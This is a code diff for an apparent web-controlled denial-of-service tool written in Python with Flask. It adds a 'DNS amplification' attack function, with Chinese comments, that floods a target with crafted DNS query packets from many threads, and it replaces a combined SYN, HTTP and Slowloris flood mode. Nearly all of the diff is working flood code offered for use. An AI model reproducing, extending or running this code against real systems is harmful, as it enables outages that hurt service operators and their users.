@@ -46,7 +46,7 @@ latency_data = {
     'http-post': [],
     'slowloris': [],
     'udp': [],
-    'combo': []
+    'dns-amp': []
 }
 latency_lock = threading.Lock()
 
@@ -395,6 +395,61 @@ def udp_flood_attack(target_ip, target_port, duration, attack_type='udp'):
     
     print(f"[UDP] 線程停止")
 
+def dns_amplification_attack(target_ip, target_port, duration, attack_type='dns-amp'):
+    """DNS 放大攻擊 - 使用大型 DNS 查詢"""
+    global attack_running
+    print(f"[DNS-AMP] 線程啟動: {target_ip}:{target_port}")
+    
+    # DNS 查詢類型，選擇可能產生大量響應的查詢
+    dns_queries = [
+        # 查詢 ANY 記錄（已被很多 DNS 服務器禁用，但仍可測試）
+        b'\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\xff\x00\x01',
+        # 查詢 TXT 記錄
+        b'\xbb\xbb\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x10\x00\x01',
+        # 查詢 MX 記錄
+        b'\xcc\xcc\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x06google\x03com\x00\x00\x0f\x00\x01',
+        # 查詢 DNSSEC 相關記錄（通常響應較大）
+        b'\xdd\xdd\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x06google\x03com\x00\x00\x30\x00\x01',
+    ]
+    
+    start_time = time.time()
+    
+    while attack_running and (time.time() - start_time) < duration:
+        try:
+            packet_start = time.time()
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            
+            # 綁定隨機源端口
+            try:
+                source_port = random.randint(10000, 65535)
+                sock.bind(('', source_port))
+                track_source_port(source_port)
+            except:
+                pass
+            
+            # 選擇隨機 DNS 查詢
+            query = random.choice(dns_queries)
+            
+            # 發送 DNS 查詢
+            sock.sendto(query, (target_ip, target_port))
+            
+            # 記錄延遲
+            latency = (time.time() - packet_start) * 1000
+            track_latency(attack_type, latency)
+            
+            increment_stat('packets')
+            increment_stat('requests')
+            increment_stat('successful_requests')
+            
+            sock.close()
+            
+        except Exception as e:
+            add_error(f"DNS-AMP: {type(e).__name__}")
+            increment_stat('failed_requests')
+            time.sleep(0.001)
+    
+    print(f"[DNS-AMP] 線程停止")
+
 # ==================== API 端點 ====================
 
 @app.route('/')
@@ -483,23 +538,11 @@ def start_attack():
                 t.start()
                 attack_threads.append(t)
     
-    elif attack_type == 'combo':
+    elif attack_type == 'dns-amp':
+        # DNS 放大攻擊
         for ip_type, ip_addr in resolved_ips:
-            # SYN Flood
-            for _ in range(threads_per_ip // 3):
-                t = threading.Thread(target=syn_flood_attack, args=(ip_addr, target_port, duration, 'combo'), daemon=True)
-                t.start()
-                attack_threads.append(t)
-            
-            # HTTP Flood
-            for _ in range(threads_per_ip // 3):
-                t = threading.Thread(target=http_flood_attack, args=(ip_addr, target_port, 'GET', duration, True, 'combo'), daemon=True)
-                t.start()
-                attack_threads.append(t)
-            
-            # Slowloris
-            for _ in range(5):
-                t = threading.Thread(target=slowloris_attack, args=(ip_addr, target_port, duration, 'combo'), daemon=True)
+            for _ in range(threads_per_ip):
+                t = threading.Thread(target=dns_amplification_attack, args=(ip_addr, target_port, duration, 'dns-amp'), daemon=True)
                 t.start()
                 attack_threads.append(t)
     
@@ -550,7 +593,7 @@ def get_stats():
 def get_latency():
     """獲取各種攻擊類型的平均延遲"""
     latency_result = {}
-    for attack_type in ['syn', 'http-get', 'http-post', 'slowloris', 'udp', 'combo']:
+    for attack_type in ['syn', 'http-get', 'http-post', 'slowloris', 'udp', 'dns-amp']:
         avg = get_average_latency(attack_type)
         latency_result[attack_type] = avg if avg is not None else 0
     return jsonify(latency_result)
